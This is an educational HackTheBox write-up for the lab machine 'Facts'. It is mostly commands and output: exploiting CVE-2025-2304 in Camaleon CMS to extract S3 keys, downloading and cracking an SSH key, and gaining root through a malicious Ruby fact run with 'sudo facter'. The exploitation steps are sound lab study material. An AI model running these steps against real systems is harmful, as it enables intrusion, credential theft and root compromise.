# HackTheBox — Facts Write-up

| | |
|---|---|
| **Platform** | HackTheBox |
| **Machine** | Facts |
| **OS** | Linux |
| **Domain** | `facts.htb` |
| **Focus** | Web enum, Camaleon CMS privilege escalation (CVE-2025-2304), S3 credential leak, SSH key cracking, `facter` sudo abuse |

> Educational write-up of a HackTheBox lab machine. Substitute your own target IP where shown.

---

## 1. Reconnaissance

Run a full port scan with default scripts and version detection:

```bash
nmap -p- -sC -sV <target-ip>
```

Identify the open ports (SSH and a web service), then map the host:

```bash
sudo subl /etc/hosts        # add: <target-ip>  facts.htb
```

Browsing `http://facts.htb` shows a site with no obvious sign-up or login entry point, so move to content/vhost discovery.

---

## 2. Web Enumeration

**Directory brute force:**

```bash
gobuster dir -u http://facts.htb \
  -w /usr/share/wordlists/dirbuster/directory-medium.txt
```

```
admin    (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
```

(Optionally, vhost enumeration with `gobuster vhost` can be run in parallel to check for subdomains.)

The `/admin` redirect leads to a login portal at `http://facts.htb/admin/login`.

---

## 3. Identifying the CMS

The admin portal allows **register** and **login**. After creating an account and logging in, opening the **profile** page and scrolling down reveals the software in use:

- **Camaleon CMS**, **version 2.9.0**

That version is affected by a known authenticated privilege-escalation flaw — **CVE-2025-2304**.

---

## 4. Exploitation — CVE-2025-2304 (Authenticated Privilege Escalation)

Using the public PoC for CVE-2025-2304, run the exploit with the credentials of the account just registered:

```bash
python exploit.py -u http://facts.htb -U haems -P password -e -r
```

```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
    User ID: 5
    Current User Role: client
[+] Loading PRIVILEGE ESCALATION
    User ID: 5
    Updated User Role: admin
[+] Extracting S3 Credentials
    s3 access key: AKIAF71E63668BE2BADE
    s3 secret key: faPCaUz2hba2P2cv6b99BNSinJztIZdWmwmbcKln
    s3 endpoint: http://localhost:54321
[+] Reverting User Role
    User ID: 5
    User Role: client
```

The exploit temporarily elevates the account to **admin**, reads the application's stored **S3 credentials** (access key, secret key, and endpoint), then reverts the role to avoid leaving traces.

Recovered S3 credentials:

```
Access Key: AKIAF71E63668BE2BADE
Secret Key: faPCaUz2hba2P2cv6b99BNSinJztIZdWmwmbcKln
Endpoint:   http://localhost:54321   (reachable as http://facts.htb:54321)
```

---

## 5. Looting the S3 Bucket

The endpoint is an S3-compatible object store (MinIO). Configure an AWS CLI profile with the leaked keys:

```bash
aws configure --profile facts
# AWS Access Key ID:     AKIAF71E63668BE2BADE
# AWS Secret Access Key: faPCaUz2hba2P2cv6b99BNSinJztIZdWmwmbcKln
# Default region name:   us-east-1
# Default output format: json
```

List the `internal` bucket, pointing at the custom endpoint:

```bash
aws s3 ls s3://internal/.ssh/ \
  --endpoint-url http://facts.htb:54321 --profile facts
```

There's an SSH private key in `.ssh/`. Download it:

```bash
aws s3 cp s3://internal/.ssh/id_ed25519 facts.id \
  --endpoint-url http://facts.htb:54321 --profile facts
chmod 600 facts.id
```

---

## 6. Cracking the SSH Key Passphrase

The private key is passphrase-protected. Convert it to a John-compatible hash and crack it:

```bash
ssh2john facts.id > facts.hash
john --wordlist=/usr/share/wordlists/rockyou.txt facts.hash
```

The passphrase recovered:

```
dragonballz
```

---

## 7. Foothold

Log in over SSH using the cracked key (the key belongs to the `trivia` user):

```bash
ssh trivia@facts.htb -i facts.id
# (passphrase: dragonballz)
```

The user flag lives under `william`'s home directory, which `trivia` can read:

```bash
trivia@facts:~$ cat /home/william/user.txt
```

---

## 8. Privilege Escalation — `sudo facter`

Check sudo privileges:

```bash
sudo -l
```

`trivia` is allowed to run **`/usr/bin/facter`** as root. Facter (Puppet's system-inventory tool) supports **custom facts written in Ruby** loaded from a directory via `--custom-dir`. Because custom facts are arbitrary Ruby code executed by Facter, a malicious fact run as root yields a root shell.

Write a custom fact that spawns a shell:

```bash
echo 'Facter.add(:exploit) { setcode { system("/bin/bash") } }' > /tmp/exploit.rb
```

Run Facter as root, pointing it at the custom directory and naming the fact:

```bash
sudo /usr/bin/facter --custom-dir /tmp exploit
```

```
root@facts:/# id
uid=0(root) ...
```

Root access achieved; the root flag can be read from `/root/root.txt`.


